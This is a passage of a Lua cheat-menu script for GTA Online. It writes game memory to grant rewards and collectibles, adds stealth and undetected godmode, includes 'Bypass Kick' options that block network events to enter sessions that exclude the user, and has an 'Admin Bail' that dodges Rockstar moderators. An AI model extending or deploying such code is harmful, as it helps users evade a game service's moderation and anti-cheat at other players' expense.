    if players.get_script_host() ~= players.user() and get_transition_state(players.user()) ~= 0 then
        menu.trigger_command(menu.ref_by_path("Players>"..players.get_name_with_tags(players.user())..">Friendly>Give Script Host"))
    end
end)

menu.toggle(online, "Anti-Chat", {}, "It keeps it from coming out when you're writing the 'icon' on top of you", function()
	if on then
		menu.trigger_commands("hidetyping on")
	else
		menu.trigger_commands("hidetyping off")
	end
end)

local maxHealth <const> = 328
menu.toggle_loop(online, ("Off the radar"), {"undeadotr"}, "", function()
	if ENTITY.GET_ENTITY_MAX_HEALTH(players.user_ped()) ~= 0 then
		ENTITY.SET_ENTITY_MAX_HEALTH(players.user_ped(), 0)
	end
end, function ()
end, function ()
	ENTITY.SET_ENTITY_MAX_HEALTH(players.user_ped(), maxHealth)
end)

menu.toggle_loop(online, "Accept Joins", {}, "Automatically accept join screens", function() -- credits to jinx for letting me steal this
    local message_hash = HUD.GET_WARNING_SCREEN_MESSAGE_HASH()
    if message_hash == 15890625 or message_hash == -398982408 or message_hash == -587688989 then
        PAD.SET_CONTROL_VALUE_NEXT_FRAME(2, 201, 1.0)
        util.yield(200)
    end
end)

menu.toggle(online, "Thermal Weapons", {}, "Make all your weapons with thermal sight with the key. E", function()
    local thermal_command = menu.ref_by_path("Game>Rendering>Thermal Vision", 33)
    if PLAYER.IS_PLAYER_FREE_AIMING(PLAYER.PLAYER_PED_ID()) then
        if PAD.IS_CONTROL_JUST_PRESSED(38, 38) then
            if not GRAPHICS.GET_USINGSEETHROUGH() then
                menu.trigger_command(thermal_command, "on")
                GRAPHICS.SEETHROUGH_SET_MAX_THICKNESS(50)
            else
                menu.trigger_command(thermal_command, "off")
                GRAPHICS.SET_SEETHROUGH(false)
                GRAPHICS.SEETHROUGH_SET_MAX_THICKNESS(1) --default value is 1
            end
        end
    elseif GRAPHICS.GET_USINGSEETHROUGH() then
        menu.trigger_command(thermal_command, "off")
        GRAPHICS.SEETHROUGH_SET_MAX_THICKNESS(1)
    end
end)

menu.toggle(online, "Cold Blooded", {}, "Remove Thermal Signature.", function(toggle)
    local player = PLAYER.PLAYER_PED_ID()
    if toggle then
        PED.SET_PED_HEATSCALE_OVERRIDE(player, 0)
    else
        PED.SET_PED_HEATSCALE_OVERRIDE(player, 1)
    end
end)

joining = false
menu.toggle(online, "Player Notification", {}, "Warns when a player enters the session", function(on_toggle)
	if on_toggle then
		joining = true
	else
		joining = false
	end
end)

local maxps = menu.list(online, "Host Tools", {}, "")

menu.slider(maxps, "Players Max", {}, "Maximum number of players in lobbynonly works when you are the host", 1, 32, 32, 1, function (value)
    if Stand_internal_script_can_run then
        NETWORK.NETWORK_SESSION_SET_MATCHMAKING_GROUP_MAX(0, value)
        util.toast("free slots",NETWORK.NETWORK_SESSION_GET_MATCHMAKING_GROUP_FREE(0))
    end
end)
menu.slider(maxps, "Spectators Max", {}, "Maximum viewers n only works when you're the host", 0, 2, 2, 1, function (value)
    if Stand_internal_script_can_run then
        NETWORK.NETWORK_SESSION_SET_MATCHMAKING_GROUP_MAX(4, value)
        util.toast("free slots",NETWORK.NETWORK_SESSION_GET_MATCHMAKING_GROUP_FREE(4))
    end
end)

--menu.toggle(online, "Real time", {}, "Make your game match the current time of your location.", function(toggle)
--    irlTime = toggle
--    local smoothTimeOn = menu.get_value(smoothTransitionCommand) == 1
--    toggleSwitchState(smoothTransitionCommand, smoothTimeOn)
--    util.create_tick_handler(function()
--        menu.trigger_command(setClockCommand, os.date("%H:%M:%S"))
--        return irlTime
--    end)
--    toggleSwitchState(smoothTransitionCommand, smoothTimeOn)
--end)

local services = menu.list(online, "Services", {}, "")

menu.action(services, "Order Heli", {}, "Order a luxury helicopter to your location", function(on_toggle)
    if NETWORK.NETWORK_IS_SESSION_ACTIVE() and
	not NETWORK.NETWORK_IS_SCRIPT_ACTIVE("am_heli_taxi", -1, true, 0) then
        memory.write_int(memory.script_global(2815059 + 876), 1)
        memory.write_int(memory.script_global(2815059 + 883), 1)
	end
end)

menu.action(services, "Remove Reward", {}, "", function()
    if memory.read_int(memory.script_global(1835502 + 4 + 1 + (players.user() * 3))) == 1 then 
        memory.write_int(memory.script_global(2815059 + 1856 + 17), -1)
        memory.write_int(memory.script_global(2359296 + 1 + 5149 + 13), 2880000)
    else
        util.toast("You have no reward :/")
    end
end)

recovery = menu.list(online, "Recovery", {}, "")


menu.action(recovery, "M16", {""}, "", function()
   memory.write_int(memory.script_global(262145 + 32775), 1)
end)

local Collectibles = menu.list(recovery, "Collectibles", {}, "")

menu.click_slider(Collectibles, "Tapes", {""}, "", 0, 9, 0, 1, function(i)
   util.trigger_script_event(1 << players.user(), {0xB9BA4D30, 0, 0x0, i, 1, 1, 1})
end)

menu.click_slider(Collectibles, "Hidden Caches", {""}, "", 0, 9, 0, 1, function(i)
    util.trigger_script_event(1 << players.user(), {0xB9BA4D30, 0, 0x1, i, 1, 1, 1})
end)

menu.click_slider(Collectibles, "Chests/Treasure", {""}, "", 0, 1, 0, 1, function(i)
    util.trigger_script_event(1 << players.user(), {0xB9BA4D30, 0, 0x2, i, 1, 1, 1})
end)

menu.click_slider(Collectibles, "Radio Antennas", {""}, "", 0, 9, 0, 1, function(i)
    util.trigger_script_event(1 << players.user(), {0xB9BA4D30, 0, 0x3, i, 1, 1, 1})
end)

menu.click_slider(Collectibles, "USBs", {""}, "", 0, 19, 0, 1, function(i)
    util.trigger_script_event(1 << players.user(), {0xB9BA4D30, 0, 0x4, i, 1, 1, 1})
end)

menu.action(Collectibles, "Shipwrecks", {""}, "", function()
    util.trigger_script_event(1 << players.user(), {0xB9BA4D30, 0, 0x5, 0, 1, 1, 1})
end)

menu.click_slider(Collectibles, "Buried", {""}, "", 0, 1, 0, 1, function(i)
   util.trigger_script_event(1 << players.user(), {0xB9BA4D30, 0, 0x6, i, 1, 1, 1})
end)

menu.action(Collectibles, "HalloweenShirts", {""}, "", function()
    util.trigger_script_event(1 << players.user(), {0xB9BA4D30, 0, 0x7, 1, 1, 1, 1})
end)

menu.click_slider(Collectibles, "Lanterns", {""}, "", 0, 9, 0, 1, function(i)
    util.trigger_script_event(1 << players.user(), {0xB9BA4D30, 0, 0x8, i, 1, 1, 1})
end)

menu.click_slider(Collectibles, "Lamar organic products", {""}, "", 0, 99, 0, 1, function(i)
    util.trigger_script_event(1 << players.user(), {0xB9BA4D30, 0, 0x9, i, 1, 1, 1})
end)

menu.click_slider(Collectibles, "Junk Energy Free Flight", {""}, "", 0, 9, 0, 1, function(i)
    util.trigger_script_event(1 << players.user(), {0xB9BA4D30, 0, 0xA, i, 1, 1, 1})
end)

local pump_list = menu.list(Collectibles, "Pumkpins", {}, "Funciona")
for idx, coords in pumps_from_gtaweb_eu do
    pump_list:action("Pumpkin " .. idx, {}, "Teletransportate a las calabazas", function()
        util.teleport_2d(coords[1], coords[2])
    end)
end

local bypasskick = menu.list(online, "Bypass Kick", {}, "Options that allow you to use methods to n enter the session if you are being blocked.")

menu.divider(bypasskick, "Normal Methods")

menu.toggle(bypasskick, "Method V1", {}, "It gives you a limited time for you to expel the one who blocks you", function(on_toggle)
    local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
    local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
    local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
    local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
    if on_toggle then
        menu.trigger_commands("nobgscript on")
        menu.trigger_command(BlockIncSyncs)
        menu.trigger_command(BlockNetEvents)
        util.toast("Activated, now enter your session and prepare the kick")
    else
        menu.trigger_commands("nobgscript off")
        menu.trigger_command(UnblockIncSyncs)
        menu.trigger_command(UnblockNetEvents)
        util.toast("Done, all off")
    end
end)

menu.toggle(bypasskick, "Method V2", {}, "A little more functional but also with more network errors", function(on_toggle)
    local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
    local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
    local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
    local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
    local BlockBailing = menu.ref_by_path("Online>Protections>Block Bailing>Player No Longer In Session")
    local BlockBailing2 = menu.ref_by_path("Online>Protections>Block Bailing>Switching Primary Crew")
    local BlockBailing3 = menu.ref_by_path("Online>Protections>Block Bailing>Spectating Related")
    local BlockBailing4 = menu.ref_by_path("Online>Protections>Block Bailing>Other Reasons")
    if on_toggle then
        menu.trigger_commands("nobgscript on")
        menu.trigger_command(BlockIncSyncs)
        menu.trigger_command(BlockNetEvents)
        menu.trigger_command(BlockBailing, "on")
        menu.trigger_command(BlockBailing2, "on")
        menu.trigger_command(BlockBailing3, "on")
        menu.trigger_command(BlockBailing4, "on")
        util.toast("Activated, now enter your session and prepare the kick")
    else
        menu.trigger_commands("nobgscript off")
        menu.trigger_command(UnblockIncSyncs)
        menu.trigger_command(UnblockNetEvents)
        menu.trigger_command(BlockBailing3, "off")
        util.toast("Done, all off")
    end
end)

menu.toggle(bypasskick, "Method V3", {}, "More functional method, but for developers, you will receive notification of all network events", function(on_toggle)
local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
local BlockBailing = menu.ref_by_path("Online>Protections>Block Bailing>Player No Longer In Session")
local BlockBailing2 = menu.ref_by_path("Online>Protections>Block Bailing>Switching Primary Crew")
local BlockBailing3 = menu.ref_by_path("Online>Protections>Block Bailing>Spectating Related")
local BlockBailing4 = menu.ref_by_path("Online>Protections>Block Bailing>Other Reasons")
local ShowNotis = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Notification>Enabled")
local BlockRaw = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
local UnShowNotis = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Notification>Disabled")
local UnBlockRaw = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
if on_toggle then
    menu.trigger_commands("nobgscript on")
    menu.trigger_command(BlockIncSyncs)
    menu.trigger_command(BlockNetEvents)
    menu.trigger_command(BlockBailing, "on")
    menu.trigger_command(BlockBailing2, "on")
    menu.trigger_command(BlockBailing3, "on")
    menu.trigger_command(BlockBailing4, "on")
    menu.trigger_command(ShowNotis)
    menu.trigger_command(BlockRaw)
    util.toast("Activated, now enter your session and prepare the kick")
else
    menu.trigger_commands("nobgscript off")
    menu.trigger_command(UnblockIncSyncs)
    menu.trigger_command(UnblockNetEvents)
    menu.trigger_command(BlockBailing3, "off")
    menu.trigger_command(UnShowNotis)
    menu.trigger_command(UnBlockRaw)
    util.toast("Done, all off")
end
end)

menu.toggle(bypasskick, "Method V4", {}, "Probably break the game, use at your own risk", function(on_toggle)
    local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
    local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
    local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
    local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
    local BlockBailing = menu.ref_by_path("Online>Protections>Block Bailing>Player No Longer In Session")
    local BlockBailing2 = menu.ref_by_path("Online>Protections>Block Bailing>Switching Primary Crew")
    local BlockBailing3 = menu.ref_by_path("Online>Protections>Block Bailing>Spectating Related")
    local BlockBailing4 = menu.ref_by_path("Online>Protections>Block Bailing>Other Reasons")
    local ShowNotis = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Notification>Enabled")
    local BlockRaw = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
    local UnShowNotis = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Notification>Disabled")
    local UnBlockRaw = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
    local DontAsk = menu.ref_by_path("Online>Transitions>Speed Up>Don't Ask For Permission To Spawn")
    if on_toggle then
        menu.trigger_commands("nobgscript on")
		menu.trigger_commands("skipbroadcast on")
        menu.trigger_commands("speedupspawn on")
        menu.trigger_commands("speedupfmmc on")
        menu.trigger_commands("skipswoopdown on")
        menu.trigger_command(BlockIncSyncs)
        menu.trigger_command(BlockNetEvents)
        menu.trigger_command(BlockBailing, "on")
        menu.trigger_command(BlockBailing2, "on")
        menu.trigger_command(BlockBailing3, "on")
        menu.trigger_command(BlockBailing4, "on")
        menu.trigger_command(ShowNotis)
        menu.trigger_command(BlockRaw)
        menu.trigger_commands("skipbroadcast on")
        menu.trigger_command(DontAsk, "on")
        menu.trigger_commands("skipswoopdown on")
        util.toast("Activated, now enter your session and prepare the kick")
    else
        menu.trigger_commands("nobgscript off")
		menu.trigger_commands("skipbroadcast off")
        menu.trigger_commands("speedupspawn off")
        menu.trigger_commands("speedupfmmc off")
        menu.trigger_commands("skipswoopdown off")
        menu.trigger_command(UnblockIncSyncs)
        menu.trigger_command(UnblockNetEvents)
        menu.trigger_command(BlockBailing3, "off")
        menu.trigger_command(UnShowNotis)
        menu.trigger_command(UnBlockRaw)
        menu.trigger_commands("skipbroadcast off")
        menu.trigger_command(DontAsk, "off")
        menu.trigger_commands("skipswoopdown off")
        util.toast("Done, all off")
    end
    end)

--------------------------------------------------------------------------------------------------------------------------------
--Protecciones

menu.action(protects, "Stop all sounds", {"stopsounds"}, "", function()
    for i=-1,100 do
        AUDIO.STOP_SOUND(i)
        AUDIO.RELEASE_SOUND_ID(i)
    end
end)

menu.action(protects, "Remove ring", {}, "Remove the ringtone from the phone stopping it from ringing.", function()
    if AUDIO.IS_PED_RINGTONE_PLAYING then
        for i=-1, 50 do
            AUDIO.STOP_PED_RINGTONE(i)
        end
    end
end)

local quitarf = menu.list(protects, "Anti Freeze Methods")

menu.action(quitarf, "Anti Freeze V1", {}, "Try restarting some natives to remove the freeze state.", function()
    --local playerpos = ENTITY.GET_ENTITY_COORDS(ped, false)
    local player = PLAYER.PLAYER_PED_ID()
    ENTITY.FREEZE_ENTITY_POSITION(player, false)
    MISC.OVERRIDE_FREEZE_FLAGS()
    menu.trigger_commands("rcleararea")
end)

menu.action(quitarf, "Anti Freeze V2 'Test'", {}, "Try restarting some natives to remove the freeze state nWith this method you will die.", function()
    --local playerpos = ENTITY.GET_ENTITY_COORDS(ped, false)
    local player = PLAYER.PLAYER_PED_ID()
    ENTITY.FREEZE_ENTITY_POSITION(player, false)
    ENTITY.SET_ENTITY_COORDS(player, 1, 0, 0, 1, false)
    MISC.OVERRIDE_FREEZE_FLAGS()
    menu.trigger_commands("rcleararea")
end)

menu.toggle(protects, "Panic Mode", {"panic"}, "This renders an anti-crash mode removing all kinds of events from the game at all costs.", function(on_toggle)
    local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
    local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
    local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
    local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
    if on_toggle then
        menu.trigger_commands("desyncall on")
        menu.trigger_commands("potatomode on")
        menu.trigger_commands("trafficpotato on")
        menu.trigger_command(BlockIncSyncs)
        menu.trigger_command(BlockNetEvents)
        menu.trigger_commands("anticrashcamera on")
    else
        menu.trigger_commands("desyncall off")
        menu.trigger_commands("potatomode off")
        menu.trigger_commands("trafficpotato off")
        menu.trigger_command(UnblockIncSyncs)
        menu.trigger_command(UnblockNetEvents)
        menu.trigger_commands("anticrashcamera off")
    end
end)

--menu.toggle_loop(protects, "Block Crashes/Kicks", {}, "Try blocking crashes or kicks nactivating menu protections.", function(on)
--end)

menu.toggle_loop(protects, "Admin Bail", {}, "If it detects an R* admin it changes your session.", function(on)
    bailOnAdminJoin = on
end)

if bailOnAdminJoin then
    if players.is_marked_as_admin(player_id) then
        util.toast(players.get_name(player_id) .. " If there is an admin, for another session.")
        menu.trigger_commands("quickbail")
        return
    end
end

menu.toggle_loop(protects, "Block Transaction Error 'Test'", {}, "Likely to lead to errors, use under responsibility", function(on_toggle)
    local TransactionError = menu.ref_by_path("Online>Protections>Events>Transaction Error Event>Block")
    local TransactionErrorV = menu.ref_by_path("Online>Protections>Events>Transaction Error Event>Notification")
    if on_toggle then
        menu.trigger_command(TransactionError, "on")
        menu.trigger_command(TransactionErrorV, "on")
        for i = 1, 100 do
            menu.trigger_commands("removeloader")
        end
        --util.toast("It's not my fault the log error, wait for Stand to fix it")
    end
end)

--menu.toggle_loop(protects, "Block Fire/Lag", {}, "", function()
--    local coords = ENTITY.GET_ENTITY_COORDS(players.user_ped() , false);
--    GRAPHICS.REMOVE_PARTICLE_FX_IN_RANGE(coords.x, coords.y, coords.z, 400)
--    GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(players.user_ped())
--end)

menu.toggle_loop(protects, "Block PFTX/Particulate Lag", {}, "", function()
    local coords = ENTITY.GET_ENTITY_COORDS(players.user_ped() , false);
    GRAPHICS.REMOVE_PARTICLE_FX_IN_RANGE(coords.x, coords.y, coords.z, 400)
    GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(players.user_ped())
end)

menu.toggle_loop(protects, "Anti Beast", {}, "Prevent them from turning you the beast with stand etc.", function()
    if SCRIPT.GET_NUMBER_OF_THREADS_RUNNING_THE_SCRIPT_WITH_THIS_HASH(util.joaat("am_hunt_the_beast")) > 0 then
        local host
        repeat
            host = NETWORK.NETWORK_GET_HOST_OF_SCRIPT("am_hunt_the_beast", -1, 0)
            util.yield()
        until host ~= -1
        util.toast(players.get_name(host).." started Hunt The Beast. Killing script...")
        menu.trigger_command(menu.ref_by_path("Online>Session>Session Scripts>Hunt the Beast>Stop Script"))
    end
end)

local values = {
    [0] = 0,
    [1] = 50,
    [2] = 88,
    [3] = 160,
    [4] = 208,
}

local anticage = menu.list(protects, "Anti-cage protection", {}, "")
local alpha = 160
menu.slider(anticage, "Cage Alpha", {"cagealpha"}, "Cage transparency. If it is at 0 you will not see it", 0, #values, 3, 1, function(amount)
    alpha = values[amount]
end)

menu.toggle_loop(anticage, "Anti Cage", {"anticage"}, "", function()
    local user = players.user_ped()
    local veh = PED.GET_VEHICLE_PED_IS_USING(user)
    local my_ents = {user, veh}
    for i, obj_ptr in ipairs(entities.get_all_objects_as_pointers()) do
        local net_obj = memory.read_long(obj_ptr + 0xd0)
        if net_obj == 0 or memory.read_byte(net_obj + 0x49) == players.user() then
            continue
        end
        local obj_handle = entities.pointer_to_handle(obj_ptr)
        CAM._DISABLE_CAM_COLLISION_FOR_ENTITY(obj_handle)
        for i, data in ipairs(my_ents) do
            if data ~= 0 and ENTITY.IS_ENTITY_TOUCHING_ENTITY(data, obj_handle) and alpha > 0 then
                ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(obj_handle, data, false)
                ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(data, obj_handle, false)
                ENTITY.SET_ENTITY_ALPHA(obj_handle, alpha, false)
            end
            if data ~= 0 and ENTITY.IS_ENTITY_TOUCHING_ENTITY(data, obj_handle) and alpha == 0 then
                entities.delete_by_handle(obj_handle)
            end
        end
        SHAPETEST.RELEASE_SCRIPT_GUID_FROM_ENTITY(obj_handle)
    end
end)

fmugger = menu.list(protects, "Objects/Peds", {}, "")

local anti_mugger = menu.list(protects, "Anti-Mugger")

menu.toggle_loop(anti_mugger, "To Me", {}, "Block Muggers targeting you.", function() -- thx nowiry for improving my method :D
    if NETWORK.NETWORK_IS_SCRIPT_ACTIVE("am_gang_call", 0, true, 0) then
        local ped_netId = memory.script_local("am_gang_call", 63 + 10 + (0 * 7 + 1))
        local sender = memory.script_local("am_gang_call", 287)
        local target = memory.script_local("am_gang_call", 288)
        local player = players.user()

        util.spoof_script("am_gang_call", function()
            if (memory.read_int(sender) ~= player and memory.read_int(target) == player 
            and NETWORK.NETWORK_DOES_NETWORK_ID_EXIST(memory.read_int(ped_netId)) 
            and NETWORK.NETWORK_REQUEST_CONTROL_OF_NETWORK_ID(memory.read_int(ped_netId))) then
                local mugger = NETWORK.NET_TO_PED(memory.read_int(ped_netId))
                entities.delete_by_handle(mugger)
                util.toast("Blocked mugger from " .. players.get_name(memory.read_int(sender)))
            end
        end)
    end
end)

menu.toggle_loop(anti_mugger, "Someone else", {}, "Block Muggers targeted to someone else.", function()
    if NETWORK.NETWORK_IS_SCRIPT_ACTIVE("am_gang_call", 0, true, 0) then
        local ped_netId = memory.script_local("am_gang_call", 63 + 10 + (0 * 7 + 1))
        local sender = memory.script_local("am_gang_call", 287)
        local target = memory.script_local("am_gang_call", 288)
        local player = players.user()

        util.spoof_script("am_gang_call", function()
            if memory.read_int(target) ~= player and memory.read_int(sender) ~= player
            and NETWORK.NETWORK_DOES_NETWORK_ID_EXIST(memory.read_int(ped_netId)) 
            and NETWORK.NETWORK_REQUEST_CONTROL_OF_NETWORK_ID(memory.read_int(ped_netId)) then
                local mugger = NETWORK.NET_TO_PED(memory.read_int(ped_netId))
                entities.delete_by_handle(mugger)
                util.toast("Block mugger sent by " .. players.get_name(memory.read_int(sender)) .. " to " .. players.get_name(memory.read_int(target)))
            end
        end)
    end
end)

menu.toggle_loop(fmugger, "Objects F/", {"ghostobjects"}, "Disables collisions with objects", function()
    local user = players.user_ped()
    local veh = PED.GET_VEHICLE_PED_IS_USING(user)
    local my_ents = {user, veh}
    for i, obj_ptr in ipairs(entities.get_all_objects_as_pointers()) do
        local net_obj = memory.read_long(obj_ptr + 0xd0)
        local obj_handle = entities.pointer_to_handle(obj_ptr)
        ENTITY.SET_ENTITY_ALPHA(obj_handle, 255, false)
        CAM.SET_GAMEPLAY_CAM_IGNORE_ENTITY_COLLISION_THIS_UPDATE(obj_handle)
        for i, data in ipairs(my_ents) do
            ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(obj_handle, data, false)
            ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(data, obj_handle, false)  
        end
        SHAPETEST.RELEASE_SCRIPT_GUID_FROM_ENTITY(obj_handle)
    end
end)

menu.toggle_loop(fmugger, "Vehicles F/", {"ghostvehicles"}, "Disables collisions with cars", function()
    local user = players.user_ped()
    local veh = PED.GET_VEHICLE_PED_IS_USING(user)
    local my_ents = {user, veh}
    for i, veh_ptr in ipairs(entities.get_all_vehicles_as_pointers()) do
        local net_veh = memory.read_long(veh_ptr + 0xd0)
        local veh_handle = entities.pointer_to_handle(veh_ptr)
        ENTITY.SET_ENTITY_ALPHA(veh_handle, 255, false)
        CAM.SET_GAMEPLAY_CAM_IGNORE_ENTITY_COLLISION_THIS_UPDATE(veh_handle)
        for i, data in ipairs(my_ents) do
            ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(veh_handle, data, false)
            ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(data, veh_handle, false)  
        end
        SHAPETEST.RELEASE_SCRIPT_GUID_FROM_ENTITY(veh_handle)
    end
end)

local pool_limiter = menu.list(protects, "Limitador Pool", {}, "")
local ped_limit = 175
menu.slider(pool_limiter, "Limitador pool/Peds", {"pedlimit"}, "", 0, 256, 175, 1, function(amount)
    ped_limit = amount
end)

local veh_limit = 200
menu.slider(pool_limiter, "Limitador pool/Vehicles", {"vehlimit"}, "", 0, 300, 150, 1, function(amount)
    veh_limit = amount
end)

local obj_limit = 750
menu.slider(pool_limiter, "Limitador pool/objects", {"objlimit"}, "", 0, 2300, 750, 1, function(amount)
    obj_limit = amount
end)

local projectile_limit = 25
menu.slider(pool_limiter, "Limitador pool/Projectiles", {"projlimit"}, "", 0, 50, 25, 1, function(amount)
    projectile_limit = amount
end)

menu.toggle_loop(pool_limiter, "Enable pool limiter", {}, "", function()
    local ped_count = 0
    for _, ped in pairs(entities.get_all_peds_as_handles()) do
        util.yield()
        if ped ~= players.user_ped() then
            ped_count += 1
        end
        if ped_count >= ped_limit then
            for _, ped in pairs(entities.get_all_peds_as_handles()) do
                util.yield()
                entities.delete_by_handle(ped)
            end
            util.toast("Cleaning bools of peds...")
        end
    end
    local veh__count = 0
    for _, veh in ipairs(entities.get_all_vehicles_as_handles()) do
        util.yield()
        veh__count += 1
        if veh__count >= veh_limit then
            for _, veh in ipairs(entities.get_all_vehicles_as_handles()) do
                entities.delete_by_handle(veh)
            end
            util.toast("Cleaning bools of vehicles...")
        end
    end
    local obj_count = 0
    for _, obj in pairs(entities.get_all_objects_as_handles()) do
        util.yield()
        obj_count += 1
        if obj_count >= obj_limit then
            for _, obj in pairs(entities.get_all_objects_as_handles()) do
                entities.delete_by_handle(obj)
            end
            util.toast("Cleaning bools of objects...")
        end
    end
end)

--------------------------------------------------------------------------------------------------------------------------------
-- Coches
menu.toggle_loop(vehicles, "Silent GodMode", {}, "It will not be detected by most menus", function()
    ENTITY.SET_ENTITY_PROOFS(entities.get_user_vehicle_as_handle(), true, true, true, true, true, 0, 0, true)
    end, function() ENTITY.SET_ENTITY_PROOFS(PED.GET_VEHICLE_PED_IS_IN(players.user(), false), false, false, false, false, false, 0, 0, false)
end)

menu.toggle_loop(vehicles, "Indicator Lights", {}, "", function()
    if(PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), false)) then
        local vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)

        local left = PAD.IS_CONTROL_PRESSED(34, 34)
        local right = PAD.IS_CONTROL_PRESSED(35, 35)
        local rear = PAD.IS_CONTROL_PRESSED(130, 130)

        if left and not right and not rear then
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 1, true)
        elseif right and not left and not rear then
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 0, true)
        elseif rear and not left and not right then
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 1, true)
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 0, true)
        else
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 0, false)
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 1, false)
        end
    end
end)

modificaciones = menu.list(vehicles, "Vehicle modifications", {}, "")

--[[
menu.click_slider_float(modificaciones, "Suspension", {"suspensionheight"}, "", -100, 100, 0, 1, function(value)
    value/=100
    local player = players.user_ped()
    local pos = ENTITY.GET_ENTITY_COORDS(player, false)
    local VehicleHandle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
    if VehicleHandle == 0 then return end
    local CAutomobile = entities.handle_to_pointer(VehicleHandle)
    local CHandlingData = memory.read_long(CAutomobile + 0x0938)
    memory.write_float(CHandlingData + 0x00D0, value)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(VehicleHandle, pos.x, pos.y, pos.z + 2.8, false, false, false) -- Dropping vehicle so the suspension updates
end)

menu.click_slider_float(modificaciones, "Torque", {"torque"}, "", 0, 1000, 100, 10, function(value)
    value/=100
    local VehicleHandle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
    if VehicleHandle == 0 then return end
    local CAutomobile = entities.handle_to_pointer(VehicleHandle)
    local CHandlingData = memory.read_long(CAutomobile + 0x0938)
    memory.write_float(CHandlingData + 0x004C, value)
end)

menu.click_slider_float(modificaciones, "Upshift", {"upshift"}, "", 0, 500, 100, 10, function(value)
    value/=100
    local VehicleHandle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
    if VehicleHandle == 0 then return end
    local CAutomobile = entities.handle_to_pointer(VehicleHandle)
    local CHandlingData = memory.read_long(CAutomobile + 0x0938)
    memory.write_float(CHandlingData + 0x0058, value)
end)

menu.click_slider_float(modificaciones, "DownShift", {"downshift"}, "", 0, 500, 100, 10, function(value)
    value/=100
    local VehicleHandle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
    if VehicleHandle == 0 then return end
    local CAutomobile = entities.handle_to_pointer(VehicleHandle)
    local CHandlingData = memory.read_long(CAutomobile + 0x0938)
    memory.write_float(CHandlingData + 0x005C, value)
end)

menu.click_slider_float(modificaciones, "Curve multiplier", {"curve"}, "", 0, 500, 100, 10, function(value)
    value/=100
    local VehicleHandle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
    if VehicleHandle == 0 then return end
    local CAutomobile = entities.handle_to_pointer(VehicleHandle)
    local CHandlingData = memory.read_long(CAutomobile + 0x0938)
    memory.write_float(CHandlingData + 0x0094, value)
end)
--]]

menu.toggle_loop(modificaciones, "Random Enhancements", {}, "Only works on vehicles you spawned in for some reason", function()
    local mod_types = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 12, 14, 15, 16, 23, 24, 25, 27, 28, 30, 33, 35, 38, 48}
    if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped()) then
        for i, upgrades in ipairs(mod_types) do
